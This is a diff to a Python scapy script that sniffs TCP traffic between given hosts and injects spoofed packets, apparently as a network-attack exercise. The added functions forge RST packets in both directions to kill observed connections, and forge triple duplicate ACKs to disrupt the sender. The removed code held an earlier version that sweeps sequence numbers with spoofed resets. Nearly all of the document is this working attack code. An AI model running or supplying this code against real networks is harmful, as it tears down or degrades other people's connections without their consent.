@@ -3,6 +3,50 @@ import sys
 import scapy.all as scapy
 scapy.conf.use_pcap = True
 
+packets_intercepted = 0
+
+def send_rst_packet(captured_packet):
+    source_ip = captured_packet[scapy.IP].src
+    destination_ip = captured_packet[scapy.IP].dst
+    source_port = captured_packet[scapy.TCP].sport
+    destination_port = captured_packet[scapy.TCP].dport
+    sequence_number = captured_packet[scapy.TCP].seq
+    acknowledgement_number = captured_packet[scapy.TCP].ack
+
+    # Construct the RST packet to source IP and port
+    rst_packet_to_source = scapy.IP(src=destination_ip, dst=source_ip) / scapy.TCP(sport=destination_port, dport=source_port, 
+    flags="R", seq=acknowledgement_number, ack=sequence_number)
+
+    rst_packet_to_dest = scapy.IP(src=source_ip, dst=destination_ip) / scapy.TCP(sport=source_port, dport=destination_port, 
+    seq=sequence_number, ack=acknowledgement_number, flags="R")
+
+    global packets_intercepted
+    # Send the RST packets
+    scapy.send(rst_packet_to_source, verbose=False)
+    scapy.send(rst_packet_to_dest, verbose=False)
+    print(f"Intercapted packet {packets_intercepted}")
+    packets_intercepted += 1
+
+def send_3ack_packets(captured_packet):
+    source_ip = captured_packet[scapy.IP].src
+    destination_ip = captured_packet[scapy.IP].dst
+    source_port = captured_packet[scapy.TCP].sport
+    destination_port = captured_packet[scapy.TCP].dport
+    sequence_number = captured_packet[scapy.TCP].seq
+    acknowledgement_number = captured_packet[scapy.TCP].ack
+
+    # Construct the RST packet to source IP and port
+    ack_packet_to_source = scapy.IP(src=destination_ip, dst=source_ip) / scapy.TCP(sport=destination_port, dport=source_port, 
+    flags="A", seq=sequence_number, ack=acknowledgement_number+1)
+
+    global packets_intercepted
+    # Send the RST packets
+    for i in range(3):
+        scapy.send(ack_packet_to_source, verbose=True)
+
+    #print(f"Sent 3 ACK packets, run nr. {packets_intercepted}")
+    packets_intercepted += 1
+
 if __name__ == "__main__":
 
     argc = len(sys.argv)
@@ -19,62 +63,11 @@ if __name__ == "__main__":
     attack = sys.argv[4]
 
     if attack.lower() == "rst":
-        # Creating a tcpserver socket
-
-        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        # Binding the socket to a public host, and a well-known port
-
-        #s.connect((dest_addr, dest_port))
-
-        # Send tcp RST packet using scapy
-
-        print("Assuming this is blocking")
-        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=1)
-        print("Captured packet")
-        capture.summary()
-        # Extract TCP sequence number from the captured packet
-        seq = capture[0].seq
-        # Get the captured packet's source port
-        sport = capture[0].sport
-        dport = capture[0].dport
-
-        tcp = capture[0].getlayer(scapy.TCP)
-        tcp.flags = "R"
-
-        for i in range(seq, seq + 10000000, 10000):
-            # Create a TCP packet with RST flag set
-            tcp.seq = i
-
-            tcp_to_dest = tcp.copy()
-            tcp_to_dest.dport = dport
-            tcp_to_dest.flags = "R"
-            rst_to_dest = scapy.IP(src=source_addr, dst=dest_addr)/tcp_to_dest
-
-            tcp_to_src = tcp.copy()
-            tcp_to_src.dport = sport
-            tcp_to_src.flags = "R"
-            rst_to_src = scapy.IP(src=dest_addr, dst=source_addr)/tcp_to_src
-            
-            # Send the packet
-            scapy.send(rst_to_dest)
-            scapy.send(rst_to_src)
-            print("Sent packet with seq: " + str(i))
-
-        print(f"Sent rst packets to {source_addr}:{sport} and {dest_addr}:{dest_port}")
-
-        # for i in range(seq, seq + 10000000, 10000):
-        #     # Create a TCP packet with RST flag set
-        #     rst = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=sport, dport=dest_port, flags="R", seq=i)
-            
-        #     # Send the packet
-        #     scapy.send(rst)
-        #     print("Sent packet with seq: " + str(i))
-
-
-        # p = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=dest_port, dport=dest_port, flags="R", seq=seq+5000)
-        # print(p.show())
-        # scapy.send(p)
+        print(f"Waiting for TCP connection between {source_addr} and {dest_addr}:{dest_port} to send RST packet")
+        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=500, prn=send_rst_packet)
+        print("Completed")
 
     elif attack.lower() == "3ack":
-        pass
+        print(f"Waiting for TCP connection between {source_addr} and {dest_addr}:{dest_port} to send 3ACK packets")
+        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=100000, prn=send_3ack_packets)
+        print("Completed")
